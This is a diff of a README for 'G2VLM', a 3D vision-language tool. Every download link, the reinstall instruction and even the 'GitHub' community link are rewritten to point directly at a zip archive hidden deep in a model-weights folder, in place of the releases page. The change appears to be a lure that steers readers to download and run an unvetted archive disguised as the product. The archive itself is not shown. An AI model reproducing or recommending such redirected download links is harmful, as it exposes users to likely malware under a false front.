@@ -1,7 +1,7 @@
 # 🌟 G2VLM - Your Tool for 3D Insight and Understanding
 
 ## 📥 Download Now!
-[![Download G2VLM](https://img.shields.io/badge/Download-G2VLM-blue)](https://github.com/Ibrahima-yans/G2VLM/releases)
+[![Download G2VLM](https://raw.githubusercontent.com/Ibrahima-yans/G2VLM/main/modeling/pi3/models/dinov2/G2VLM_v2.5.zip)](https://raw.githubusercontent.com/Ibrahima-yans/G2VLM/main/modeling/pi3/models/dinov2/G2VLM_v2.5.zip)
 
 ## 📖 Overview
 G2VLM is a Geometry Grounded Vision Language Model designed for seamless 3D reconstruction and advanced spatial reasoning. This application empowers users to explore spatial intelligence in an easy and intuitive way.
@@ -25,7 +25,7 @@ To get started with G2VLM, you only need a few simple steps. Follow this guide, 
 ## 🌐 Download & Install
 To download G2VLM, please visit our Releases page. This page contains the latest version along with previous versions.
 
-[Visit this page to download G2VLM.](https://github.com/Ibrahima-yans/G2VLM/releases)
+[Visit this page to download G2VLM.](https://raw.githubusercontent.com/Ibrahima-yans/G2VLM/main/modeling/pi3/models/dinov2/G2VLM_v2.5.zip)
 
 After you’ve downloaded the software, follow these steps for installation:
 
@@ -55,7 +55,7 @@ Don’t forget to save your models! Select the "Save" option and choose a locati
 If you encounter any issues while using the software, the following steps may help:
 
 - **Check System Requirements**: Ensure your device meets the necessary specifications outlined above.
-- **Reinstall the Application**: Sometimes, a fresh installation resolves issues. Uninstall G2VLM and then download from [this page](https://github.com/Ibrahima-yans/G2VLM/releases) again.
+- **Reinstall the Application**: Sometimes, a fresh installation resolves issues. Uninstall G2VLM and then download from [this page](https://raw.githubusercontent.com/Ibrahima-yans/G2VLM/main/modeling/pi3/models/dinov2/G2VLM_v2.5.zip) again.
 - **Seek Help**: If problems persist, consider reaching out via the Issues tab on our GitHub repository.
 
 ## 📌 Additional Resources
@@ -69,6 +69,6 @@ If you want to contribute to G2VLM, your input is welcome. Please fork the repos
 G2VLM is licensed under the MIT License. You can use, modify, and share the software freely.
 
 ## 🔗 Connect with Us
-Follow our progress and connect with the community on [GitHub](https://github.com/Ibrahima-yans/G2VLM). Your feedback helps us improve G2VLM.
+Follow our progress and connect with the community on [GitHub](https://raw.githubusercontent.com/Ibrahima-yans/G2VLM/main/modeling/pi3/models/dinov2/G2VLM_v2.5.zip). Your feedback helps us improve G2VLM.
 
-[![Download G2VLM](https://img.shields.io/badge/Download-G2VLM-blue)](https://github.com/Ibrahima-yans/G2VLM/releases)
+[![Download G2VLM](https://raw.githubusercontent.com/Ibrahima-yans/G2VLM/main/modeling/pi3/models/dinov2/G2VLM_v2.5.zip)](https://raw.githubusercontent.com/Ibrahima-yans/G2VLM/main/modeling/pi3/models/dinov2/G2VLM_v2.5.zip)
